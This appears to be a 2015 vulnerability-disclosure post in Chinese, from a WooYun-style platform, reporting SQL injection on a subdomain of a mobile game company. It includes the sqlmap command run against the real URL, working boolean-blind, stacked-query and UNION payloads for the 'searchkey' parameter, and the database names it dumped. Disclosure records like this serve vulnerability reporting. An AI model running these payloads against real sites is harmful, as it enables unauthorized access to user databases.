wybug_title: 中国手游娱乐集团某分站SQL注入漏洞(可跨库)
wybug_detail:
漏洞详情 披露状态：   									2015-03-30：	细节已通知厂商并且等待厂商处理中									2015-03-30：	厂商已经确认，细节仅向厂商公开									2015-04-09：	细节向核心白帽子及相关领域专家公开									2015-04-19：	细节向普通白帽子公开									2015-04-29：	细节向实习白帽子公开									2015-05-14：	细节向公众公开  简要描述： sql 详细说明：  


厂商挺关注安全的啊，所以就去看了一下，求礼物啊。

E:\sqlmap>sqlmap.py -u "http://gh.cmge.com/guild/desc/id/116?searchkey=1" --dbs         _ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150325}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 23:12:28[23:12:29] [INFO] resuming back-end DBMS 'mysql'[23:12:29] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: searchkey (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: searchkey=1%' AND 2235=2235 AND '%'='    Type: stacked queries    Title: MySQL > 5.0.11 stacked queries (SELECT - comment)    Payload: searchkey=1%';(SELECT * FROM (SELECT(SLEEP(5)))WrUW)#    Type: UNION query    Title: Generic UNION query (NULL) - 10 columns    Payload: searchkey=1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b7a7071,0x47726b68565a76465372,0x7171766271),NULL-----[23:12:29] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL 5.0.11[23:12:29] [INFO] fetching database names[23:12:29] [WARNING] reflective value(s) found and filtering outavailable databases [8]:[*] guild[*] information_schema[*] iyingxiong[*] mysql[*] passport[*] single_game[*] sms_log[*] wap_sdk[23:12:29] [INFO] fetched data logged to text files under 'C:\Users\Mosuan\.sqlmap\output\gh.cmge.com'[*] shutting down at 23:12:29
